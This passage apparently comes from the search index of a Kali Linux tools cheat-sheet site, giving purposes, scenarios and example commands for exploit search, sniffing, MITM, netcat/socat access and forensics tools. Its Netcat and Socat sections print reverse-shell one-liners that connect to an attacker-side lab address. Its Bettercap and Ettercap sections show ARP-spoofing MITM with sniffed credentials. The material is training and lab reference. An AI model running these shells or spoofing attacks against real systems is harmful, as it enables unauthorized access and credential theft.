</ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Msfvenom/#msfvenom-commands","title":"Msfvenom Commands","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Searchsploit/","title":"Searchsploit","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Searchsploit/#official-documentation-httpswwwexploit-dbcomsearchsploit","title":"Official Documentation: https://www.exploit-db.com/searchsploit","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Searchsploit/#cheat-sheet-searchsploit-commands","title":"Cheat Sheet: Searchsploit Commands","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Searchsploit/#purpose","title":"Purpose","text":"<p>Searchsploit is a command-line tool to search Exploit-DB offline. It lets you quickly find local exploit proof-of-concepts for known software vulnerabilities.</p>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Searchsploit/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Search for exploits of a service/version banner you discover during enumeration.  </li> <li>Real world: Map discovered software versions against known vulnerabilities for testing.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Searchsploit/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Installed with <code>exploitdb</code> package on Kali. Database stored locally.  </li> <li>Basic syntax: <code>searchsploit &lt;keyword&gt;</code>.  </li> <li>Options:</li> <li><code>-m &lt;id&gt;</code> \u2192 mirror (copy) exploit to current dir  </li> <li><code>-x &lt;id&gt;</code> \u2192 open exploit in editor  </li> <li><code>-p</code> \u2192 show full exploit path  </li> <li><code>-u</code> \u2192 update database  </li> <li>Database path: <code>/usr/share/exploitdb/</code>.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Searchsploit/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Search for vsftpd exploits\n$ searchsploit vsftpd 2.3.4\n# Output:\n# ----------------------------------------------\n# Exploit Title                       | Path\n# vsftpd 2.3.4 - Backdoor Command Exe | unix/remote/17491.rb\n\n# Copy exploit locally\n$ searchsploit -m 17491\n# Output: Exploit copied to ./17491.rb\n\n# Open exploit in editor\n$ searchsploit -x 17491\n</code></pre> <p>Searchsploit Basics</p> <ul> <li>Use <code>searchsploit &lt;keyword&gt;</code> with service name/version from nmap or banners.</li> <li>Use <code>-m</code> to copy exploit locally so you don\u2019t edit originals.</li> <li>Update regularly with <code>searchsploit -u</code>.</li> <li>Not every exploit works out-of-the-box \u2014 read and adapt code before running.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Searchsploit/#searchsploit-commands","title":"Searchsploit Commands","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Bettercap/","title":"Bettercap","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Bettercap/#official-documentation-httpswwwbettercaporg","title":"Official Documentation: https://www.bettercap.org/","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Bettercap/#cheat-sheet-bettercap-commands","title":"Cheat Sheet: Bettercap Commands","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Bettercap/#purpose","title":"Purpose","text":"<p>Bettercap is a powerful, modular network attack and monitoring tool. It supports sniffing, MITM, spoofing, credential harvesting, and IoT/ble hacking.</p>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Bettercap/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Intercept HTTP traffic or inject payloads on a LAN challenge to steal cookies or credentials.  </li> <li>Real world: Demonstrate risks of ARP spoofing, DNS spoofing, and insecure protocols in an authorized engagement.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Bettercap/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Start with: <code>bettercap -iface &lt;iface&gt;</code>.  </li> <li>Interactive shell with modules:</li> <li><code>net.probe on</code> \u2192 discover hosts  </li> <li><code>net.recon on</code> \u2192 gather more info about devices  </li> <li><code>arp.spoof on</code> \u2192 perform ARP poisoning  </li> <li><code>net.sniff on</code> \u2192 capture traffic (with filters)  </li> <li><code>dns.spoof on</code> \u2192 spoof DNS replies  </li> <li>Key commands:</li> <li><code>help</code> \u2192 show modules  </li> <li><code>set &lt;module.option&gt; &lt;value&gt;</code> \u2192 configure module  </li> <li><code>show modules</code> / <code>show options</code> \u2192 view available tools and configs  </li> <li>Use <code>bettercap -eval \"net.probe on; net.recon on\"</code> for one-liners.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Bettercap/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Launch Bettercap on wlan0\n$ sudo bettercap -iface wlan0\nbettercap v2.32.0 [core] ...\nbettercap &gt; help\n\n# Discover hosts\nbettercap &gt; net.probe on\nbettercap &gt; net.show\n# Output:\n# 192.168.56.1   08:00:27:ab:cd:ef\n# 192.168.56.101 08:00:27:12:34:56\n\n# Run ARP spoofing against target\nbettercap &gt; set arp.spoof.targets 192.168.56.101\nbettercap &gt; arp.spoof on\nbettercap &gt; net.sniff on\n</code></pre> <p>Bettercap Basics</p> <ul> <li>Use <code>bettercap -iface &lt;iface&gt;</code> to start; run modules inside interactive shell.</li> <li><code>net.probe</code> + <code>net.recon</code> discover hosts; <code>arp.spoof</code> + <code>net.sniff</code> for MITM.</li> <li>Commands can be chained in <code>-eval</code> for quick scripts.</li> <li>MITM attacks are noisy and disruptive \u2014 only run in labs or with permission.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Bettercap/#bettercap-commands","title":"Bettercap Commands","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Ettercap/","title":"Ettercap","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Ettercap/#official-documentation-httpswwwettercap-projectorg","title":"Official Documentation: https://www.ettercap-project.org/","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Ettercap/#cheat-sheet-ettercap-commands","title":"Cheat Sheet: Ettercap Commands","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Ettercap/#purpose","title":"Purpose","text":"<p>Ettercap is a classic tool for man-in-the-middle (MITM) attacks on LANs. It supports sniffing, ARP poisoning, DNS spoofing, and packet injection.</p>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Ettercap/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Poison ARP cache to intercept traffic and capture passwords sent over HTTP.  </li> <li>Real world: Demonstrate ARP spoofing or DNS hijacking risks on unsecured LANs.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Ettercap/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Run as root: <code>ettercap</code>.  </li> <li>Modes: GUI (<code>-G</code>), text (<code>-T</code>), curses (<code>-C</code>), daemon (<code>-D</code>).  </li> <li>Typical workflow:</li> <li><code>ettercap -T -M arp:remote /&lt;target1&gt;/ /&lt;target2&gt;/</code> \u2192 perform ARP poisoning MITM.  </li> <li>Use filters to modify or sniff packets.  </li> <li>Plugins:</li> <li><code>dns_spoof</code> \u2192 spoof DNS queries  </li> <li><code>remote_browser</code> \u2192 capture visited URLs  </li> <li>Config: <code>/etc/ettercap/etter.conf</code>.  </li> <li>Outputs logs with captured credentials.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Ettercap/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Text mode, ARP MITM between target and gateway\n$ sudo ettercap -T -M arp:remote /192.168.56.101/ /192.168.56.1/\n# Output:\n# ARP poisoning victims:\n#  /192.168.56.101/ 08:00:27:12:34:56\n#  /192.168.56.1/   08:00:27:ab:cd:ef\n# sniffed: USER: admin  PASS: password123  FTP 192.168.56.101\n\n# GUI mode\n$ sudo ettercap -G\n# Brings up curses/GUI for selecting targets and plugins\n</code></pre> <p>Ettercap Basics</p> <ul> <li>Use <code>-T</code> for text mode, <code>-G</code> for GUI; always run as root.</li> <li><code>-M arp:remote</code> enables ARP MITM between two hosts.</li> <li>Filters and plugins like <code>dns_spoof</code> extend functionality.</li> <li>Ettercap is old but still useful for ARP/DNS spoof demos in controlled labs.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Ettercap/#ettercap-commands","title":"Ettercap Commands","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/TCPdump/","title":"TCPdump","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/TCPdump/#official-documentation-httpswwwtcpdumporg","title":"Official Documentation: https://www.tcpdump.org/","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/TCPdump/#cheat-sheet-tcpdump-commands","title":"Cheat Sheet: TCPdump Commands","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/TCPdump/#purpose","title":"Purpose","text":"<p>Tcpdump is a command-line packet capture tool. It captures and filters packets for analysis, letting you see headers, protocols, and payloads directly in terminal or save to pcap.</p>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/TCPdump/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Capture and filter traffic on a challenge interface to find flags (like FTP passwords or HTTP secrets).  </li> <li>Real world: Quickly diagnose network issues or gather packet traces for Wireshark.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/TCPdump/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Run as root for most interfaces.  </li> <li>Syntax: <code>tcpdump [options] [filter]</code>.  </li> <li>Common flags:</li> <li><code>-i &lt;iface&gt;</code> \u2192 interface (default: first active)  </li> <li><code>-nn</code> \u2192 don\u2019t resolve hostnames/ports  </li> <li><code>-v</code>, <code>-vv</code> \u2192 verbosity  </li> <li><code>-X</code> \u2192 print hex + ASCII  </li> <li><code>-A</code> \u2192 ASCII only  </li> <li><code>-c &lt;count&gt;</code> \u2192 stop after n packets  </li> <li><code>-w &lt;file&gt;</code> \u2192 write to pcap file  </li> <li><code>-r &lt;file&gt;</code> \u2192 read from pcap file  </li> <li>Filters use pcap syntax: <code>host</code>, <code>port</code>, <code>tcp</code>, <code>udp</code>, <code>and</code>, <code>or</code>.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/TCPdump/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Capture 10 packets on eth0\n$ sudo tcpdump -i eth0 -nn -c 10\n# Output snippet:\n# IP 192.168.56.101.22 &gt; 192.168.56.1.51544: Flags [P], length 48\n\n# Capture HTTP traffic\n$ sudo tcpdump -i eth0 -nn port 80 -A\n# Output: shows ASCII HTTP requests/responses\n\n# Save capture to file\n$ sudo tcpdump -i wlan0 -w capture.pcap\n# Output: listening on wlan0, link-type EN10MB\n</code></pre> <p>Tcpdump Basics</p> <ul> <li>Use <code>-nn</code> to avoid DNS/port lookups (faster, cleaner output).</li> <li>Combine filters (<code>tcp and port 80</code>) for precision.</li> <li>Use <code>-w</code> to capture and analyze later in Wireshark.</li> <li>Tcpdump is powerful for quick filtering and is scriptable for automation.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/TCPdump/#tcpdump-commands","title":"TCPdump Commands","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Wireshark/","title":"Wireshark","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Wireshark/#official-documentation-httpswwwwiresharkorg","title":"Official Documentation: https://www.wireshark.org/","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Wireshark/#cheat-sheet-wireshark-commands","title":"Cheat Sheet: Wireshark Commands","text":""},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Wireshark/#purpose","title":"Purpose","text":"<p>Wireshark is a GUI packet analyzer. It captures traffic live or reads pcaps, with advanced filters and protocol decoding.</p>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Wireshark/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Open a provided <code>.pcap</code> to search for flags in cleartext HTTP, FTP, or DNS queries.  </li> <li>Real world: Diagnose network problems, analyze suspicious traffic, or validate protocol behavior.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Wireshark/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>GUI: <code>wireshark</code> (requires X11/GUI).  </li> <li>CLI alternative: <code>tshark</code>.  </li> <li>Common features:</li> <li>Capture on interface (requires root or group privileges).  </li> <li>Display filters: <code>http</code>, <code>ip.addr == 192.168.56.101</code>, <code>tcp.port == 21</code>.  </li> <li>Follow streams: right-click packet \u2192 Follow \u2192 TCP Stream.  </li> <li>Export objects: HTTP, SMB, etc.  </li> <li>File formats: <code>.pcap</code>, <code>.pcapng</code>.  </li> <li>Use with <code>tcpdump</code> for headless capture.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Wireshark/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Launch GUI\n$ wireshark &amp;\n# GUI opens, select interface, start capture\n\n# Display filter examples:\nhttp\nip.addr == 192.168.56.101\ntcp.port == 21\n\n# Follow TCP stream:\nRight-click packet -&gt; Follow -&gt; TCP Stream\n# Output shows plaintext conversation or HTTP request/response\n\n# Export objects:\nFile -&gt; Export Objects -&gt; HTTP -&gt; Save files\n</code></pre> <p>Wireshark Basics</p> <ul> <li>Use display filters (<code>http</code>, <code>ip.addr == X</code>) to quickly find relevant packets.</li> <li>Follow TCP Stream to reconstruct conversations.</li> <li>Use Export Objects to recover files from captures.</li> <li>Run <code>tshark</code> if only CLI access is available.</li> </ul>"},{"location":"Kali%20Tools/08%20-%20Sniffing%20and%20Spoofing/Wireshark/#wireshark-commands","title":"Wireshark Commands","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Netcat/","title":"Netcat","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Netcat/#official-documentation-httpsnetcatsourceforgenet","title":"Official Documentation: https://netcat.sourceforge.net/","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Netcat/#cheat-sheet-netcat-commands","title":"Cheat Sheet: Netcat Commands","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Netcat/#purpose","title":"Purpose","text":"<p>Netcat (nc) is a networking utility for reading/writing data across TCP/UDP. It\u2019s called the \u201cSwiss Army Knife\u201d of networking because it supports port scanning, file transfer, and reverse/bind shells.</p>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Netcat/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Spawn a reverse shell from a vulnerable machine to your listener.  </li> <li>Real world: Debug network services, test connectivity, or set up a quick data transfer channel.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Netcat/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Syntax: <code>nc [options] host port</code>.  </li> <li>Common flags:</li> <li><code>-l</code> \u2192 listen mode  </li> <li><code>-p &lt;port&gt;</code> \u2192 specify port  </li> <li><code>-v</code> \u2192 verbose  </li> <li><code>-n</code> \u2192 numeric IPs only  </li> <li><code>-u</code> \u2192 UDP mode  </li> <li><code>-e &lt;program&gt;</code> \u2192 execute program after connection (disabled in some builds; use traditional netcat or Ncat)  </li> <li>Works as listener or client.  </li> <li>Supports piping and redirection.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Netcat/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Listener (server)\n$ nc -lvnp 4444\nlistening on [any] 4444 ...\n\n# Connect to listener\n$ nc 192.168.56.1 4444\n# Connection established, data typed on one side appears on the other\n\n# Reverse shell (target side)\n$ nc 192.168.56.1 4444 -e /bin/bash\n\n# File transfer\n# Sender\n$ nc -l -p 1234 &lt; file.txt\n# Receiver\n$ nc 192.168.56.1 1234 &gt; file.txt\n</code></pre> <p>Netcat Basics</p> <ul> <li><code>-e</code> for shells may be disabled; use <code>/bin/bash &lt;&amp;3 &gt;&amp;3</code> tricks or Socat instead.</li> <li>Always specify <code>-v</code> for clarity in CTFs.</li> <li>Use piping (<code>|</code>) and redirection for quick file transfers.</li> <li>Treat Netcat shells as unstable \u2014 use for initial foothold, then upgrade.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Netcat/#netcat-commands","title":"Netcat Commands","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/SSH/","title":"SSH","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/SSH/#official-documentation-httpsmanopenbsdorgssh","title":"Official Documentation: https://man.openbsd.org/ssh","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/SSH/#cheat-sheet-ssh-commands","title":"Cheat Sheet: SSH Commands","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/SSH/#purpose","title":"Purpose","text":"<p>SSH (Secure Shell) is the standard tool for secure remote login and tunneling. It encrypts traffic and allows shell access, file transfer, and port forwarding.</p>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/SSH/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Log in with leaked credentials/keys to pivot further.  </li> <li>Real world: Administer remote systems securely, use tunneling for access to internal services.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/SSH/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Syntax: <code>ssh [user@]host [options]</code>.  </li> <li>Common options:</li> <li><code>-i &lt;keyfile&gt;</code> \u2192 specify private key  </li> <li><code>-p &lt;port&gt;</code> \u2192 custom port  </li> <li><code>-L &lt;lport&gt;:&lt;rhost&gt;:&lt;rport&gt;</code> \u2192 local port forward  </li> <li><code>-R &lt;rport&gt;:&lt;lhost&gt;:&lt;lport&gt;</code> \u2192 remote port forward  </li> <li><code>-D &lt;port&gt;</code> \u2192 dynamic (SOCKS) proxy  </li> <li>Config file: <code>~/.ssh/config</code> for shortcuts.  </li> <li>Keys: generated with <code>ssh-keygen</code>.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/SSH/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic login\n$ ssh user@192.168.56.101\n# Output: user shell prompt on remote system\n\n# Login with private key\n$ ssh -i id_rsa user@192.168.56.101\n\n# Local port forward (access internal service)\n$ ssh -L 8080:localhost:3306 user@192.168.56.101\n# Localhost:8080 forwards to remote MySQL port\n\n# Dynamic SOCKS proxy\n$ ssh -D 1080 user@192.168.56.101\n# Configure browser to use SOCKS5 proxy localhost:1080\n</code></pre> <p>SSH Basics</p> <ul> <li>Use key-based auth for better security; manage with <code>ssh-keygen</code> and <code>~/.ssh/config</code>.</li> <li>Port forwarding (<code>-L</code>, <code>-R</code>, <code>-D</code>) enables powerful tunneling and pivoting.</li> <li>Check permissions on private keys (chmod 600 id_rsa).</li> <li>Always verify host authenticity with fingerprints to prevent MITM.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/SSH/#ssh-commands","title":"SSH Commands","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Socat/","title":"Socat","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Socat/#official-documentation-httpswwwkaliorgtoolssocat","title":"Official Documentation: https://www.kali.org/tools/socat/","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Socat/#cheat-sheet-socat-commands","title":"Cheat Sheet: Socat Commands","text":""},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Socat/#purpose","title":"Purpose","text":"<p>Socat is like Netcat but more advanced, supporting many protocols, encryption, IPv6, and multiple I/O streams. It\u2019s used for shell upgrades and complex forwarding.</p>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Socat/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Upgrade a basic reverse shell into a fully interactive TTY.  </li> <li>Real world: Forward ports securely, bridge connections, or create encrypted tunnels.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Socat/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Syntax: <code>socat &lt;address1&gt; &lt;address2&gt;</code>.  </li> <li>Common uses:</li> <li>Reverse shell: <code>socat tcp-connect:&lt;ip&gt;:&lt;port&gt; exec:/bin/bash,pty,stderr,sigint,setsid,sane</code> </li> <li>Listener: <code>socat tcp-listen:&lt;port&gt;,reuseaddr,fork exec:/bin/bash,pty,stderr,sigint,setsid,sane</code> </li> <li>File transfer or port forwarding: <code>socat tcp-listen:&lt;port&gt; tcp:&lt;target&gt;:&lt;port&gt;</code> </li> <li>Options:</li> <li><code>pty,stderr,sigint,setsid,sane</code> \u2192 makes shells stable with TTY support.  </li> <li><code>fork</code> \u2192 allow multiple connections.  </li> <li><code>ssl:</code> \u2192 enable TLS.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Socat/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Reverse shell (victim to attacker)\nVictim: socat tcp-connect:192.168.56.1:4444 exec:/bin/bash,pty,stderr,sigint,setsid,sane\nAttacker: socat tcp-listen:4444,reuseaddr,fork -\n\n# Fully interactive shell upgrade\nAttacker: socat file:`tty`,raw,echo=0 tcp-listen:4444\nVictim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.1:4444\n# Result: fully interactive bash with arrow keys and tab completion\n\n# Port forward\n$ socat tcp-listen:8080,reuseaddr,fork tcp:192.168.56.101:80\n</code></pre> <p>Socat Basics</p> <ul> <li>Use <code>pty,stderr,sigint,setsid,sane</code> for stable shells.</li> <li>Great for upgrading raw shells into full TTYs.</li> <li>Supports many protocols beyond TCP (UDP, SSL, SOCKS).</li> <li>Can replace Netcat when <code>-e</code> is disabled or when advanced features are needed.</li> </ul>"},{"location":"Kali%20Tools/09%20-%20Maintaining%20Access/Socat/#socat-commands","title":"Socat Commands","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Autopsy/","title":"Autopsy","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Autopsy/#official-documentation-httpswwwautopsycom","title":"Official Documentation: https://www.autopsy.com/","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Autopsy/#cheat-sheet-autopsy-commands","title":"Cheat Sheet: Autopsy Commands","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Autopsy/#purpose","title":"Purpose","text":"<p>Autopsy is a web-based digital forensics platform (GUI) that helps analyze disk images, recover files, examine timelines, and generate reports. It's a beginner-friendly frontend for The Sleuth Kit.</p>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Autopsy/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Load a disk image from a challenge to recover deleted files or find timestamps that point to flags.  </li> <li>Real world: Triage a disk image from an incident to find suspicious files, timeline activity, and produce an evidence report.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Autopsy/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Autopsy provides a GUI (runs on http://127.0.0.1:9999 by default). Install via package manager (<code>apt install autopsy</code>) or use the upstream installer.  </li> <li>Input: disk images (E01, raw <code>.dd</code>, <code>.img</code>) or local drives (read-only). Preferred workflow: create case \u2192 add image \u2192 run ingest modules.  </li> <li>Key ingest modules: File type identification, keyword search, timeline, hash lookup, EXIF parser, email parser.  </li> <li>Reports: export HTML/PDF with findings.  </li> <li>Permissions: run as a user that can read image files; the server runs as a service and the browser is used to interact.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Autopsy/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Start Autopsy (service or CLI launcher)\n$ autopsy\n# Output:\n# Launching Autopsy server on http://127.0.0.1:9999\n# Open browser and navigate to the URL, create a new case and add an image\n\n# Typical GUI flow (no long CLI output):\n# 1. Create Case -&gt; Add Data Source -&gt; Choose disk image (image.dd)\n# 2. Select ingest modules (Timeline, File Type, Keyword Search)\n# 3. Run ingest. Progress shown in GUI. Results: recovered files, hits, and timeline entries.\n\n# Example result in GUI:\n# Recovered Files: 124\n# Keyword hits: 3 (strings: \"flag{example}\")\n# Timeline: file created 2025-06-01 12:34:56\n</code></pre> <p>Autopsy Basics</p> <ul> <li>Autopsy is GUI-first \u2014 run <code>autopsy</code> and use the browser to interact with cases and ingest modules.</li> <li>Always work on copies of images (read-only ingest) to avoid changing evidence.</li> <li>Use hash lookups (MD5/SHA1) to flag known-good/known-bad files quickly.</li> <li>Export reports (HTML/PDF) for documentation and sharing with stakeholders.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Autopsy/#autopsy-commands","title":"Autopsy Commands","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Binwalk/","title":"Binwalk","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Binwalk/#official-documentation-httpsgithubcomrefirmlabsbinwalk","title":"Official Documentation: https://github.com/ReFirmLabs/binwalk","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Binwalk/#cheat-sheet-binwalk-commands","title":"Cheat Sheet: Binwalk Commands","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Binwalk/#purpose","title":"Purpose","text":"<p>Binwalk is a firmware analysis tool that scans binary blobs to find embedded file systems, compressed archives, and firmware components. It extracts and lists embedded data for analysis.</p>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Binwalk/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Analyze a firmware blob / binary dump to extract embedded files that contain flags or credentials.  </li> <li>Real world: Reverse engineer router or IoT firmware to find configuration files, keys, or backdoors.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Binwalk/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Install via package manager (<code>apt install binwalk</code>) or pip for latest. <code>binwalk</code> often uses <code>dd</code>, <code>strings</code>, <code>tar</code>, and <code>unsquashfs</code> for extraction.  </li> <li>Common flags:</li> <li><code>-e</code> \u2192 automatic extraction of found files  </li> <li><code>-D &lt;fmt&gt;:&lt;cmd&gt;</code> \u2192 custom extraction commands for specific signatures  </li> <li><code>-B</code> \u2192 raw signature scan (fast)  </li> <li><code>--dd</code> \u2192 extract by file type with explicit mapping  </li> <li>Output: directory <code>_&lt;filename&gt;.extracted/</code> containing extracted files and extracted offsets listing.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Binwalk/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Scan for signatures\n$ binwalk firmware.bin\n# Output snippet:\n# DECIMAL       HEXADECIMAL     DESCRIPTION\n# --------------------------------------------------------------------------------\n# 64            0x40            gzip compressed data, max compression, from Unix\n# 4096          0x1000          Squashfs filesystem, little endian, version 4.0, size: 1234567 bytes\n\n# Extract automatically\n$ binwalk -e firmware.bin\n# Output:\n# Creating directory: _firmware.bin.extracted\n# Extracted gzip: _firmware.bin.extracted/64.gz\n# Extracted squashfs filesystem: _firmware.bin.extracted/1000.squashfs\n\n# Inspect extracted filesystem\n$ ls _firmware.bin.extracted/1000.squashfs-root/\nbin  etc  usr  www\n# Search for strings/flags\n$ grep -R \"flag{\" _firmware.bin.extracted || true\n# _firmware.bin.extracted/1000.squashfs-root/www/index.html: &lt;!-- flag{example_flag} --&gt;\n</code></pre> <p>Binwalk Basics</p> <ul> <li>Use <code>binwalk -e</code> to auto-extract embedded files; check <code>_filename.extracted/</code> for results.</li> <li>For SquashFS or other FS images, use <code>unsquashfs</code> or mount loopback to inspect files.</li> <li><code>--dd</code> and <code>-D</code> allow custom extraction rules for tricky signatures.</li> <li>Always inspect extracted content with strings/grep and check for credentials or flags.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Binwalk/#binwalk-commands","title":"Binwalk Commands","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Sleuthkit/","title":"Sleuthkit","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Sleuthkit/#official-documentation-httpswwwsleuthkitorg","title":"Official Documentation: https://www.sleuthkit.org/","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Sleuthkit/#cheat-sheet-sleuthkit-commands","title":"Cheat Sheet: Sleuthkit Commands","text":""},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Sleuthkit/#purpose","title":"Purpose","text":"<p>The Sleuth Kit (TSK) is a collection of command-line tools for filesystem and disk image forensics: listing files, carving, extracting file metadata, and examining partition layouts.</p>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Sleuthkit/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Use TSK to list deleted files, carve data from images, or recover specific inode contents containing flags.  </li> <li>Real world: Analyze disk images to reconstruct user activity, recover deleted evidence, and parse file system metadata.</li> </ul>"},{"location":"Kali%20Tools/10%20-%20Digital%20Forensics/Sleuthkit/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Tools included: <code>mmls</code> (partition layout), <code>fls</code> (list files and deleted entries), <code>icat</code> (extract file by inode), <code>fsstat</code> (filesystem info), <code>tsk_recover</code> (recover files).  </li> <li>Basic workflow:</li> <li><code>mmls image.dd</code> \u2192 view partition table and offsets.  </li> <li><code>fls -r -m / image.dd</code> \u2192 list files recursively with metadata and deleted markers.  </li> <li><code>icat image.dd &lt;inode&gt; &gt; 